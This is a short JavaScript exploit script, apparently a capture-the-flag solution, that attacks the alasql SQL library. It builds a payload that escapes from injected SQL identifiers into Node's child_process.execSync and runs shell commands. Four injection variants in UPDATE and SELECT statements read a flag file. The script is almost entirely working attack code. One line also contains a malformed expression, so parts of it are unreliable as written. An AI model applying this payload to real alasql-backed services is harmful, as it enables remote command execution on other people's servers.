const alasql = require('alasql');

// Modify the genPayload function to work within the alasql function
const genPayload = command => `new Function('return this.process.mainModule.require')()('child_process').execSync(${JSON.stringify(command)})`;

// Define your custom function for alasql
alasql.fn.getFlag = function() {
    // Use /flag command directly for the injection
    const flagCommand = '/flag';  // Direct command you want to execute

    // Run multiple injection methods with the /flag command inside your function
    const res = alasql(
        'CREATE table i_am_a_table;' +
        'INSERT INTO i_am_a_table VALUES (1337);' +
        // Injecting payloads using the /flag command
        `UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42;` +
        `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(/flag)")}+'];` +
        `SELECT \`'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(/flag)")}\` from i_am_a_table where 1;` +
        `SELECT [whatever||${genPayload(">&2 echo calling function pwned $(/flag)")||}]('whatever');`
    );

    // Return the result of the command executed (or the flag if that's what you're after)
    return res;
};

// Call the getFlag function
const result = alasql.fn.getFlag();
console.log(result);
